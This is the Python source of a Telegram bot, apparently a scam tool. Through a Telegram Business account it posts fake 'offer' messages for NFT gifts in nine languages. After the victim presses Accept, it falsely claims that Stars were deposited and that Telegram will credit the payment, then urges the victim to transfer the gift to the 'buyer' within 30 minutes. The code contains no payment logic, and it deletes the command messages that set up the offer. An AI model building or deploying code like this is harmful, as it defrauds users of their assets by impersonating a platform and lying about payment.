import asyncio
from datetime import datetime, timedelta, timezone
from html import escape
import logging

from aiogram import Bot, Dispatcher, F, Router
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
from aiogram.filters import CommandStart
from aiogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    LinkPreviewOptions,
    Message,
)

from config import Config
from database import Offer, OfferDatabase
from parser import format_amount, parse_info_command, parse_offer_command


STAR_EMOJI_ID = "5217427186285325482"
GRAM_EMOJI_ID = "5264766603584641330"




logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
logger = logging.getLogger(__name__)

router = Router()
config: Config
database: OfferDatabase


def display_name(message: Message) -> str:
    user = message.from_user
    if user is None:
        return "Пользователь"
    return user.first_name or user.full_name or "Пользователь"


def offer_sender(message: Message) -> tuple[int, str, str | None] | None:
    user = message.from_user
    if user is None:
        return None
    return user.id, display_name(message), user.username


def remaining_hours(offer: Offer) -> int:
    seconds = max(0, (offer.expires_at - datetime.now(timezone.utc)).total_seconds())
    return max(1, int((seconds + 3599) // 3600))


def is_english(offer: Offer) -> bool:
    return offer.language.lower() == "en"


def is_chinese(offer: Offer) -> bool:
    return offer.language.lower() == "zh"


def is_arabic(offer: Offer) -> bool:
    return offer.language.lower() == "ar"


def is_korean(offer: Offer) -> bool:
    return offer.language.lower() == "ko"


def is_japanese(offer: Offer) -> bool:
    return offer.language.lower() == "ja"


def is_tagalog(offer: Offer) -> bool:
    return offer.language.lower() == "tl"


def is_thai(offer: Offer) -> bool:
    return offer.language.lower() == "th"


def is_malay(offer: Offer) -> bool:
    return offer.language.lower() == "ms"


def nft_preview_options(gift_url: str) -> LinkPreviewOptions:
    return LinkPreviewOptions(
        url=f"{gift_url}#",  # <--- Добавили #, чтобы Telegram не крал ссылку из текста
        is_disabled=False,
        prefer_large_media=True,
        show_above_text=True,
    )


def warning_text(offer: Offer) -> str:
    if is_english(offer):
        return (
            "Warning!\n\n"
            "Follow the instructions to avoid losing your gift and receive payment.\n\n"
            "Press OK if you have read this warning."
        )
    if is_chinese(offer):
        return (
            "注意！\n\n"
            "请按照说明操作，以免失去礼物并确保收到付款。\n\n"
            "阅读后请点击确定。"
        )
    if is_arabic(offer):
        return (
            "تنبيه!\n\n"
            "اتبع التعليمات حتى لا تفقد هديتك وتحصل على المبلغ.\n\n"
            "اضغط موافق بعد قراءة التنبيه."
        )
    if is_korean(offer):
        return (
            "주의!\n\n"
            "선물을 잃지 않고 대금을 받으려면 지침을 따르세요.\n\n"
            "경고를 읽었다면 확인을 누르세요."
        )
    if is_japanese(offer):
        return (
            "注意！\n\n"
            "ギフトを失わずに支払いを受けるために、指示に従ってください。\n\n"
            "警告を読んだらOKを押してください。"
        )
    if is_tagalog(offer):
        return (
            "Babala!\n\n"
            "Sundin ang mga tagubilin upang hindi mawala ang iyong regalo at matanggap ang bayad.\n\n"
            "Pindutin ang OK kung nabasa mo na ang babalang ito."
        )
    if is_thai(offer):
        return (
            "คำเตือน!\n\n"
            "ทำตามคำแนะนำเพื่อไม่ให้เสียของขวัญและได้รับเงิน\n\n"
            "กดตกลงหากคุณอ่านคำเตือนนี้แล้ว"
        )
    if is_malay(offer):
        return (
            "Amaran!\n\n"
            "Ikut arahan untuk mengelakkan kehilangan hadiah dan menerima bayaran.\n\n"
            "Tekan OK jika anda telah membaca amaran ini."
        )
    return (
        "Внимание!\n\n"
        "Следуйте инструкциям, чтобы не потерять подарок и получить оплату.\n\n"
        "Нажмите ОК, если прочитали предупреждение."
    )


def callback_status_text(offer: Offer) -> str:
    if is_english(offer):
        return "Done"
    if is_chinese(offer):
        return "完成"
    if is_arabic(offer):
        return "تم"
    if is_korean(offer):
        return "완료"
    if is_japanese(offer):
        return "完了"
    if is_tagalog(offer):
        return "Tapos na"
    if is_thai(offer):
        return "เสร็จแล้ว"
    if is_malay(offer):
        return "Selesai"
    return "Готово"


async def safe_callback_answer(
    callback: CallbackQuery,
    text: str = "",
    *,
    show_alert: bool = False,
) -> None:
    try:
        await callback.answer(text, show_alert=show_alert)
    except TelegramBadRequest as error:
        if "query is too old" in str(error).lower() or "query id is invalid" in str(error).lower():
            logger.debug("Ignoring expired callback query: %s", error)
            return
        raise



def offer_caption(offer: Offer, *, resolved: bool = False) -> str:
    english = is_english(offer)
    buyer = escape(offer.buyer_name)
    amount = escape(format_amount(offer.amount))
    gift_name = escape(f"{offer.gift_name}#{offer.gift_number}")
    gift_link = escape(offer.gift_url, quote=True)

    if offer.currency == "stars":
        price = f'<b>{amount} <tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐️</tg-emoji></b>'
    else:
        price = f'<b>{amount} <tg-emoji emoji-id="{GRAM_EMOJI_ID}">💎</tg-emoji></b>'

    # Строим текст с переносами и СКРЫТОЙ ссылкой
    if english:
        first_line = (
            f"The user <b>{buyer}</b> offer you\n"
            f"{price} for the gift\n"
            f'<a href="{gift_link}">{gift_name}</a>'
        )
    elif is_chinese(offer):
        first_line = (
            f"用户 <b>{buyer}</b> 为礼物\n"
            f'<a href="{gift_link}">{gift_name}</a> 出价 {price}'
        )
    elif is_arabic(offer):
        first_line = (
            f"يقدم المستخدم <b>{buyer}</b> مبلغ {price} مقابل الهدية\n"
            f'<a href="{gift_link}">{gift_name}</a>'
        )
    elif is_korean(offer):
        first_line = (
            f"사용자 <b>{buyer}</b>님이 선물\n"
            f'<a href="{gift_link}">{gift_name}</a>에 대해\n'
            f"{price}을(를) 제안합니다"
        )
    elif is_japanese(offer):
        first_line = (
            f"ユーザー <b>{buyer}</b> がギフト\n"
            f'<a href="{gift_link}">{gift_name}</a> に\n'
            f"{price} をオファーしています"
        )
    elif is_tagalog(offer):
        first_line = (
            f"Ang user <b>{buyer}</b> ay nag-aalok\n"
            f"{price} para sa regalo\n"
            f'<a href="{gift_link}">{gift_name}</a>'
        )
    elif is_thai(offer):
        first_line = (
            f"ผู้ใช้ <b>{buyer}</b> เสนอ\n"
            f"{price} สำหรับของขวัญ\n"
            f'<a href="{gift_link}">{gift_name}</a>'
        )
    elif is_malay(offer):
        first_line = (
            f"Pengguna <b>{buyer}</b> menawarkan\n"
            f"{price} untuk hadiah\n"
            f'<a href="{gift_link}">{gift_name}</a>'
        )
    else:
        first_line = (
            f"Пользователь <b>{buyer}</b> предлагает\n"
            f"Вам {price} за подарок\n"
            f'<a href="{gift_link}">{gift_name}</a>'
        )

    if resolved:
        if english:
            statuses = {
                "accepted": "Offer accepted.",
                "declined": "Offer declined.",
                "expired": "Offer expired.",
            }
            fallback_status = "Offer processed."
        elif is_chinese(offer):
            statuses = {
                "accepted": "报价已接受。",
                "declined": "报价已拒绝。",
                "expired": "报价已过期。",
            }
            fallback_status = "报价已处理。"
        elif is_arabic(offer):
            statuses = {
                "accepted": "تم قبول العرض.",
                "declined": "تم رفض العرض.",
                "expired": "انتهت صلاحية العرض.",
            }
            fallback_status = "تمت معالجة العرض."
        elif is_korean(offer):
            statuses = {
                "accepted": "제안이 수락되었습니다.",
                "declined": "제안이 거부되었습니다.",
                "expired": "제안이 만료되었습니다.",
            }
            fallback_status = "제안이 처리되었습니다."
        elif is_japanese(offer):
            statuses = {
                "accepted": "オファーが承認されました。",
                "declined": "オファーが拒否されました。",
                "expired": "オファーが期限切れになりました。",
            }
            fallback_status = "オファーが処理されました。"
        elif is_tagalog(offer):
            statuses = {
                "accepted": "Tinanggap ang alok.",
                "declined": "Tinanggihan ang alok.",
                "expired": "Nag-expire na ang alok.",
            }
            fallback_status = "Naproseso ang alok."
        elif is_thai(offer):
            statuses = {
                "accepted": "ยอมรับข้อเสนอแล้ว",
                "declined": "ปฏิเสธข้อเสนอแล้ว",
                "expired": "ข้อเสนอหมดอายุแล้ว",
            }
            fallback_status = "ประมวลผลข้อเสนอแล้ว"
        elif is_malay(offer):
            statuses = {
                "accepted": "Tawaran diterima.",
                "declined": "Tawaran ditolak.",
                "expired": "Tawaran tamat tempoh.",
            }
            fallback_status = "Tawaran diproses."
        else:
            statuses = {
                "accepted": "Предложение принято.",
                "declined": "Предложение отклонено.",
                "expired": "Срок действия предложения истёк.",
            }
            fallback_status = "Предложение обработано."
        
        second_line = f"<i>{escape(statuses.get(offer.status, fallback_status))}</i>"
        return f"{first_line}\n\n{second_line}"
    
    return first_line




def offer_keyboard(offer: Offer) -> InlineKeyboardMarkup:
    # Вставь сюда свои ID премиум-эмодзи
    DECLINE_EMOJI_ID = "5985346521103604145"  # твой ID для отклонения
    ACCEPT_EMOJI_ID = "5985596818912712352"   # твой ID для принятия

    if is_english(offer):
        decline_text = "Decline"
        accept_text = "Accept"
    elif is_chinese(offer):
        decline_text = "拒绝"
        accept_text = "接受"
    elif is_arabic(offer):
        decline_text = "رفض"
        accept_text = "قبول"
    elif is_korean(offer):
        decline_text = "거절"
        accept_text = "수락"
    elif is_japanese(offer):
        decline_text = "拒否"
        accept_text = "承認"
    elif is_tagalog(offer):
        decline_text = "Tanggihan"
        accept_text = "Tanggapin"
    elif is_thai(offer):
        decline_text = "ปฏิเสธ"
        accept_text = "ยอมรับ"
    elif is_malay(offer):
        decline_text = "Tolak"
        accept_text = "Terima"
    else:
        decline_text = "Отклонить"
        accept_text = "Принять"

    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=decline_text,
                    callback_data=f"offer:decline:{offer.id}",
                    icon_custom_emoji_id=DECLINE_EMOJI_ID,
                ),
                InlineKeyboardButton(
                    text=accept_text,
                    callback_data=f"offer:accept:{offer.id}",
                    icon_custom_emoji_id=ACCEPT_EMOJI_ID,
                ),
            ]
        ]
    )

def accepted_caption(offer: Offer) -> str:
    english = is_english(offer)
    amount = escape(format_amount(offer.amount))
    gift_name = escape(f"{offer.gift_name}#{offer.gift_number}")
    gift_link = escape(offer.gift_url, quote=True)
    
    if offer.currency == "stars":
        emoji = f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐️</tg-emoji>'
    else:
        emoji = f'<tg-emoji emoji-id="{GRAM_EMOJI_ID}">💎</tg-emoji>'

    # Тот самый эмодзи-коробочка в начале
    gift_emoji = '<tg-emoji emoji-id="6032937473162614352">🎁</tg-emoji>'
    # Новая эмодзи перед текстом передачи
    transfer_emoji = '<tg-emoji emoji-id="6028346797368283073">🎁</tg-emoji>'

    if english:
        return (
            f'{gift_emoji}Gift: <a href="{gift_link}">{gift_name}</a> <b>successfully sold!</b>\n\n'
            f'{transfer_emoji} <b>Transfer the gift to the buyer to receive '
            f'{amount} {emoji}.</b>'
        )
    if is_chinese(offer):
        return (
            f'{gift_emoji}礼物：<a href="{gift_link}">{gift_name}</a> <b>已成功售出！</b>\n\n'
            f'{transfer_emoji} <b>请将礼物转给买家，以获得 {amount} {emoji}。</b>'
        )
    if is_arabic(offer):
        return (
            f'{gift_emoji}الهدية: <a href="{gift_link}">{gift_name}</a> <b>تم بيعها بنجاح!</b>\n\n'
            f'{transfer_emoji} <b>انقل الهدية إلى المشتري لاستلام {amount} {emoji}.</b>'
        )
    if is_korean(offer):
        return (
            f'{gift_emoji}선물: <a href="{gift_link}">{gift_name}</a> <b>성공적으로 판매되었습니다!</b>\n\n'
            f'{transfer_emoji} <b>구매자에게 선물을 전달하여 {amount} {emoji}을(를) 받으세요.</b>'
        )
    if is_japanese(offer):
        return (
            f'{gift_emoji}ギフト: <a href="{gift_link}">{gift_name}</a> <b>正常に販売されました！</b>\n\n'
            f'{transfer_emoji} <b>購入者にギフトを転送して {amount} {emoji} を受け取ります。</b>'
        )
    if is_tagalog(offer):
        return (
            f'{gift_emoji}Regalo: <a href="{gift_link}">{gift_name}</a> <b>matagumpay na nabenta!</b>\n\n'
            f'{transfer_emoji} <b>I-transfer ang regalo sa buyer para makatanggap ng '
            f'{amount} {emoji}.</b>'
        )
    if is_thai(offer):
        return (
            f'{gift_emoji}ของขวัญ: <a href="{gift_link}">{gift_name}</a> <b>ขายสำเร็จแล้ว!</b>\n\n'
            f'{transfer_emoji} <b>โอนของขวัญให้ผู้ซื้อเพื่อรับ {amount} {emoji}.</b>'
        )
    if is_malay(offer):
        return (
            f'{gift_emoji}Hadiah: <a href="{gift_link}">{gift_name}</a> <b>berjaya dijual!</b>\n\n'
            f'{transfer_emoji} <b>Pindahkan hadiah kepada pembeli untuk menerima '
            f'{amount} {emoji}.</b>'
        )
    return (
        f'{gift_emoji}Подарок: <a href="{gift_link}">{gift_name}</a> <b>успешно продан!</b>\n\n'
        f'{transfer_emoji} <b>Передайте подарок покупателю для зачисления '
        f'{amount} {emoji}.</b>'
    )


def transfer_help_caption(offer: Offer) -> str:
    english = is_english(offer)
    buyer = escape(
        f"@{offer.buyer_username}" if offer.buyer_username else offer.buyer_name
    )
    gift_name = escape(f"{offer.gift_name}#{offer.gift_number}")
    if english:
        return (
            f"<b>How to transfer the gift to {buyer}:</b>\n\n"
            f"1. Transfer the gift to user: {buyer}.\n"
            f"2. Tap «Transfer NFT» and select {gift_name}.\n"
            "3. Confirm the gift transfer.\n\n"
            "Telegram will record the transaction and instantly credit the payment "
            "to your balance. The reserve is active for 24 hours."
        )
    if is_chinese(offer):
        return (
            f"<b>如何将礼物转给 {buyer}：</b>\n\n"
            f"1. 打开用户 {buyer} 的个人资料。\n"
            f"2. 点击“转移 NFT”，然后选择 {gift_name}。\n"
            "3. 确认礼物转移。\n\n"
            "Telegram 会记录交易，并将款项立即记入你的余额。预留时间为 24 小时。"
        )
    if is_arabic(offer):
        return (
            f"<b>كيفية نقل الهدية إلى {buyer}</b>\n\n"
            f"1. افتح الملف الشخصي للمستخدم {buyer}.\n"
            f"2. اضغط «نقل NFT» واختر {gift_name}.\n"
            "3. أكد نقل الهدية.\n\n"
            "سيسجل Telegram المعاملة ويضيف المبلغ إلى رصيدك. مدة الحجز 24 ساعة."
        )
    if is_korean(offer):
        return (
            f"<b>{buyer}에게 선물을 전달하는 방법:</b>\n\n"
            f"1. 사용자 {buyer}에게 선물을 전달하세요.\n"
            f"2. «NFT 전송»을 누르고 {gift_name}을(를) 선택하세요.\n"
            "3. 선물 전송을 확인하세요.\n\n"
            "Telegram이 거래를 기록하고 즉시 잔액에 입금됩니다. 예약은 24시간 동안 유효합니다."
        )
    if is_japanese(offer):
        return (
            f"<b>{buyer}へのギフトの転送方法:</b>\n\n"
            f"1. ユーザー {buyer} にギフトを転送します。\n"
            f"2. «NFT転送»をタップして {gift_name} を選択します。\n"
            "3. ギフトの転送を確認します。\n\n"
            "Telegramは取引を記録し、即座に残高に支払いを入金します。予約は24時間有効です。"
        )
    if is_tagalog(offer):
        return (
            f"<b>Paano i-transfer ang regalo kay {buyer}:</b>\n\n"
            f"1. I-transfer ang regalo sa user: {buyer}.\n"
            f"2. I-tap ang «I-transfer ang NFT» at piliin ang {gift_name}.\n"
            "3. Kumpirmahin ang pag-transfer ng regalo.\n\n"
            "Ire-record ng Telegram ang transaksyon at agad na i-credit ang bayad "
            "sa iyong balanse. Ang reserve ay aktibo sa loob ng 24 na oras."
        )
    if is_thai(offer):
        return (
            f"<b>วิธีโอนของขวัญให้ {buyer}:</b>\n\n"
            f"1. โอนของขวัญให้ผู้ใช้: {buyer}.\n"
            f"2. แตะ «โอน NFT» และเลือก {gift_name}.\n"
            "3. ยืนยันการโอนของขวัญ\n\n"
            "Telegram จะบันทึกธุรกรรมและเครดิตการชำระเงินเข้ายอดคงเหลือของคุณทันที การจองใช้ได้ 24 ชั่วโมง"
        )
    if is_malay(offer):
        return (
            f"<b>Cara memindahkan hadiah kepada {buyer}:</b>\n\n"
            f"1. Pindahkan hadiah kepada pengguna: {buyer}.\n"
            f"2. Ketik «Pindahkan NFT» dan pilih {gift_name}.\n"
            "3. Sahkan pemindahan hadiah.\n\n"
            "Telegram akan merekodkan transaksi dan mengkreditkan pembayaran "
            "ke baki anda serta-merta. Tempahan aktif selama 24 jam."
        )
    return (
        f"<b>Как передать подарок пользователю: {buyer}</b>\n\n"
        f"1. Передайте подарок пользователю: {buyer}.\n"
        f"2. Нажмите «Передать NFT» и выберите {gift_name}.\n"
        "3. Подтвердите передачу подарка.\n\n"
        "Telegram зафиксирует транзакцию и моментально зачислит оплату "
        "на ваш баланс. Резерв действует 24 часа."
    )

def accepted_keyboard(offer: Offer) -> InlineKeyboardMarkup:
    english = is_english(offer)

    # Определяем получателя для ссылки
    recipient = f"@{offer.buyer_username}" if offer.buyer_username else str(offer.buyer_id)

    if english:
        transfer_text = "Transfer NFT"
    elif is_chinese(offer):
        transfer_text = "转移 NFT"
    elif is_arabic(offer):
        transfer_text = "نقل NFT"
    else:
        transfer_text = "Передать NFT"

    # Только одна кнопка передачи
    transfer_button = InlineKeyboardButton(
        text=transfer_text,
        url=f"tg://send_gift?to={recipient}",
    )
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [transfer_button],
        ]
    )





def back_keyboard(offer: Offer) -> InlineKeyboardMarkup:
    if is_arabic(offer):
        text = "العودة إلى النقل"
    elif is_chinese(offer):
        text = "返回转移页面"
    elif is_english(offer):
        text = "Back to transfer"
    elif is_korean(offer):
        text = "전송으로 돌아가기"
    elif is_japanese(offer):
        text = "転送に戻る"
    elif is_tagalog(offer):
        text = "Bumalik sa pag-transfer"
    elif is_thai(offer):
        text = "กลับไปที่การโอน"
    elif is_malay(offer):
        text = "Kembali ke pemindahan"
    else:
        text = "Вернуться к передаче"

    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=text,
                    callback_data=f"offer:back:{offer.id}",
                )
            ]
        ]
    )


@router.message(CommandStart())
async def start_handler(message: Message) -> None:
    await message.answer(
        '<tg-emoji emoji-id="5895734085761896734">💬</tg-emoji> <b>Инструкция по настройке</b>\n\n'
        '<tg-emoji emoji-id="5841530748082851696">👑</tg-emoji> <b>Шаг 1. Купите Telegram Premium</b>\n'
        "<blockquote>Для работы с Telegram Business и создания офферов необходим Telegram Premium. "
        "Оформить его можно в настройках Telegram: Настройки → Telegram Premium.</blockquote>\n\n"
        '<tg-emoji emoji-id="5843892082447487088">⚙️</tg-emoji> <b>Шаг 2. Подключите бота к Telegram Business</b>\n'
        "<blockquote>1. Откройте Настройки → Telegram Business\n"
        "2. Перейдите в раздел Chat Bots\n"
        "3. Добавьте нашего бота в свой аккаунт</blockquote>\n\n"
        '<tg-emoji emoji-id="5893161718179173515">🔑</tg-emoji> <b>Шаг 3. Выдайте все 5 разрешений «Manage Messages»</b>\n'
        "<blockquote>При подключении бота включите все разрешения в категории «Manage Messages» "
        "(управление сообщениями):\n"
        "• Удаление сообщений\n"
        "• Редактирование сообщений\n"
        "• Закрепление сообщений\n"
        "• Управление чатом\n"
        "• Другие действия с сообщениями</blockquote>\n\n"
        '<tg-emoji emoji-id="5904692292324692386">⚠️</tg-emoji> <b>Важно</b>\n'
        "<blockquote>Без этих разрешений бот не сможет корректно обрабатывать команды "
        "<code>/info</code> и <code>/offer</code>.</blockquote>\n\n"
        '<tg-emoji emoji-id="5893255507380014983">🚀</tg-emoji> <b>Шаг 4. Создайте предложение</b>\n'
        "<blockquote><b>Владелец подарка отправляет:</b>\n"
        "<code>/info &lt;ссылка&gt; &lt;язык&gt; &lt;цена&gt; &lt;валюта&gt;</code>\n\n"
        "Бот создаст оффер и выдаст команду с названием NFT (например, <code>/offer Jellybelly#9453</code>).\n\n"
        "<b>Покупатель получает эту команду и отправляет её боту:</b>\n"
        "<code>/offer Name#Number</code>\n\n"
        "После этого оффер появится у владельца подарка.</blockquote>\n\n"
        '<tg-emoji emoji-id="5893048571560726748">🗂</tg-emoji> <b>Пояснения</b>\n'
        "<blockquote><b>Валюты:</b> <code>gram</code> — Gram, <code>star</code> — Stars.\n"
        "<b>Языки:</b> <code>ru</code> — русский, <code>en</code> — английский, "
        "<code>zh</code> — китайский, <code>ar</code> — арабский, "
        "<code>ko</code> — корейский, <code>ja</code> — японский, "
        "<code>tl</code> — тагальский, <code>th</code> — тайский, "
        "<code>ms</code> — малайский.\n\n"
        "<b>Пример:</b>\n"
        "Владелец: <code>/info https://t.me/... ru 1000 gram</code>\n"
        "Бот: выдаст <code>/offer Jellybelly#9453</code>\n"
        "Покупатель: отправляет боту <code>/offer Jellybelly#9453</code></blockquote>\n\n"
        '<tg-emoji emoji-id="5893072412924187198">💬</tg-emoji> Если возникли вопросы — напишите в поддержку.',
        parse_mode=ParseMode.HTML,
    )


@router.message(F.text.startswith("/info"))
@router.business_message(F.text.startswith("/info"))
async def info_handler(message: Message, bot: Bot) -> None:
    command = parse_info_command(message.text or "")
    if command is None or message.from_user is None:
        return

    now = datetime.now(timezone.utc)
    database.create_listing(
        seller_id=message.from_user.id,
        seller_name=display_name(message),
        seller_username=message.from_user.username,
        seller_chat_id=message.chat.id,
        seller_business_connection_id=message.business_connection_id or "",
        gift_url=command.url,
        gift_name=command.gift_name,
        gift_number=command.gift_number,
        language=command.language,
        amount=command.amount,
        currency=command.currency,
        created_at=now.isoformat(),
    )
    await delete_source_message(message, bot)

    # Формируем название NFT в формате Name#Number
    nft_name = f"{command.gift_name}#{command.gift_number}"

    await bot.send_message(
        chat_id=message.chat.id,
        text=(
            (
                "✅ <b>Done. The offer is ready.</b>\n\n"
                "<blockquote>Send this command to the buyer. "
                "The buyer should send it to you in any chat:\n"
                f"<code>/offer {nft_name}</code></blockquote>"
            )
            if command.language == "en"
            else (
                "✅ <b>Готово. Оффер готов.</b>\n\n"
                "<blockquote>Отправьте эту команду покупателю. "
                "Покупатель должен отправить её вам в любой чат:\n"
                f"<code>/offer {nft_name}</code></blockquote>"
            )
        ),
        parse_mode=ParseMode.HTML,
        **({"business_connection_id": message.business_connection_id} if message.business_connection_id else {}),
    )


@router.message(F.text.startswith("/offer"))
@router.business_message(F.text.startswith("/offer"))
async def offer_handler(message: Message, bot: Bot) -> None:
    command = parse_offer_command(message.text or "")
    sender = offer_sender(message)
    if command is None or sender is None:
        return
    buyer_id, buyer_name, buyer_username = sender

    listing = database.take_listing(command.url)
    if listing is None:
        try:
            await bot.send_message(
                chat_id=message.chat.id,
                text="Предложение по этому подарку уже недоступно.",
                **({"business_connection_id": message.business_connection_id} if message.business_connection_id else {}),
            )
        except (TelegramBadRequest, TelegramForbiddenError) as error:
            logger.warning("Could not send unavailable-offer notice: %s", error)
        return

    target_chat_id = message.chat.id
    target_business_connection_id = message.business_connection_id or ""

    now = datetime.now(timezone.utc)
    offer = database.create_offer(
        business_connection_id=target_business_connection_id,
        chat_id=target_chat_id,
        source_message_id=message.message_id,
        buyer_id=buyer_id,
        buyer_name=buyer_name,
        buyer_username=buyer_username,
        gift_url=listing.gift_url,
        gift_name=listing.gift_name,
        gift_number=listing.gift_number,
        language=listing.language,
        amount=listing.amount,
        currency=listing.currency,
        created_at=now.isoformat(),
        expires_at=(now + timedelta(hours=config.offer_ttl_hours)).isoformat(),
    )
    await delete_source_message(message, bot)
    try:
        sent = await bot.send_message(
            chat_id=target_chat_id,
            text=offer_caption(offer),
            parse_mode=ParseMode.HTML,
            link_preview_options=nft_preview_options(offer.gift_url),
            reply_markup=offer_keyboard(offer),
            **({"business_connection_id": target_business_connection_id} if target_business_connection_id else {}),
        )
    except (TelegramBadRequest, TelegramForbiddenError) as error:
        logger.warning("Could not send offer message: %s", error)
        return
    database.set_offer_message_id(offer.id, sent.message_id)


async def delete_source_message(message: Message, bot: Bot) -> None:
    business_connection_id = message.business_connection_id
    try:
        delete_business_messages = getattr(bot, "delete_business_messages", None)
        if business_connection_id and delete_business_messages is not None:
            await delete_business_messages(
                business_connection_id=business_connection_id,
                message_ids=[message.message_id],
            )
        elif business_connection_id:
            await bot.delete_message(
                chat_id=message.chat.id,
                message_id=message.message_id,
            )
    except TelegramBadRequest:
        logger.exception("Could not delete source message %s", message.message_id)


@router.callback_query(F.data.startswith("offer:"))
async def offer_callback(callback: CallbackQuery, bot: Bot) -> None:
    await safe_callback_answer(callback)
    if callback.message is None or callback.data is None:
        return

    parts = callback.data.split(":")
    if len(parts) != 3 or parts[1] not in {"accept", "decline", "help", "back", "transfer"}:
        return

    try:
        offer_id = int(parts[2])
        current = database.get_offer(offer_id)
    except (ValueError, LookupError):
        return

    business_connection_id = callback.message.business_connection_id or ""
    if business_connection_id != current.business_connection_id:
        return

    if parts[1] == "help":
        await bot.edit_message_text(
            chat_id=callback.message.chat.id,
            message_id=callback.message.message_id,
            text=transfer_help_caption(current),
            parse_mode=ParseMode.HTML,
            reply_markup=back_keyboard(current),
            **({"business_connection_id": business_connection_id} if business_connection_id else {}),
        )
        await safe_callback_answer(callback, "تم" if is_arabic(current) else "完成" if is_chinese(current) else "Done" if is_english(current) else "Готово")
        return

    if parts[1] == "back":
        await bot.edit_message_text(
            chat_id=callback.message.chat.id,
            message_id=callback.message.message_id,
            text=accepted_caption(current),
            parse_mode=ParseMode.HTML,
            link_preview_options=nft_preview_options(current.gift_url),
            reply_markup=accepted_keyboard(current),
            **({"business_connection_id": business_connection_id} if business_connection_id else {}),
        )
        await safe_callback_answer(callback, "تم" if is_arabic(current) else "完成" if is_chinese(current) else "Done" if is_english(current) else "Готово")
        return

    if parts[1] == "transfer":
        if is_english(current):
            transfer_hint = "Open the buyer profile and transfer the gift in Telegram."
        elif is_chinese(current):
            transfer_hint = "请打开买家资料，并在 Telegram 中转移礼物。"
        elif is_arabic(current):
            transfer_hint = "افتح ملف المشتري وانقل الهدية عبر Telegram."
        else:
            transfer_hint = "Откройте профиль покупателя и передайте подарок через Telegram."
        await safe_callback_answer(callback, transfer_hint, show_alert=True)
        return

    if parts[1] == "accept":
        # Показываем предупреждение про 30 минут
        if is_english(current):
            warning = "⚠️ Stars have been deposited to Telegram system. Transfer the NFT within 30 minutes or the offer will be cancelled."
        elif is_chinese(current):
            warning = "⚠️ 星星已存入 Telegram 系统。请在30分钟内转移NFT，否则报价将被取消。"
        elif is_arabic(current):
            warning = "⚠️ تم إيداع النجوم في نظام Telegram. انقل NFT خلال 30 دقيقة وإلا سيتم إلغاء العرض."
        else:
            warning = "⚠️ Звёзды внесены в систему Telegram. Передайте NFT в течение 30 минут, иначе оффер будет отменён."

        await safe_callback_answer(callback, warning, show_alert=True)
        new_status = "accepted"
    else:
        new_status = "declined"

    offer = database.take_pending_offer(offer_id, new_status)
    if offer is None:
        database.expire_old_offers()
        current = database.get_offer(offer_id)
        await safe_callback_answer(
            callback,
            (
                "العرض تمت معالجته أو انتهت صلاحيته"
                if is_arabic(current)
                else "报价已处理。" if is_chinese(current) else "Предложение уже обработано или истекло"
            ),
            show_alert=True,
        )
        return

    # Если отклонено — удаляем сообщение полностью
    if offer.status == "declined":
        try:
            if business_connection_id:
                await bot.delete_business_messages(
                    business_connection_id=business_connection_id,
                    message_ids=[callback.message.message_id],
                )
            else:
                await bot.delete_message(
                    chat_id=callback.message.chat.id,
                    message_id=callback.message.message_id,
                )
        except TelegramBadRequest:
            logger.exception("Could not delete declined offer message %s", offer.id)
        await safe_callback_answer(callback, callback_status_text(offer))
        return

    try:
        await bot.edit_message_text(
            chat_id=callback.message.chat.id,
            message_id=callback.message.message_id,
            text=accepted_caption(offer),
            parse_mode=ParseMode.HTML,
            link_preview_options=nft_preview_options(offer.gift_url),
            reply_markup=accepted_keyboard(offer),
            **({"business_connection_id": business_connection_id} if business_connection_id else {}),
        )
    except TelegramBadRequest:
        logger.exception("Could not update offer message %s", offer.id)
    await safe_callback_answer(callback, callback_status_text(offer))


async def expiry_worker() -> None:
    while True:
        try:
            expired = database.expire_old_offers()
            if expired:
                logger.info("Expired %s offer(s)", expired)
        except Exception:
            logger.exception("Offer expiry worker failed")
        await asyncio.sleep(60)


async def main() -> None:
    global config, database
    config = Config.from_env()
    database = OfferDatabase(config.database_path)
    bot = Bot(token=config.bot_token)
    dispatcher = Dispatcher()
    dispatcher.include_router(router)
    expiry_task = asyncio.create_task(expiry_worker())
    try:
        await dispatcher.start_polling(bot, allowed_updates=dispatcher.resolve_used_update_types())
    finally:
        expiry_task.cancel()
        database.close()
        await bot.session.close()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Bot stopped")
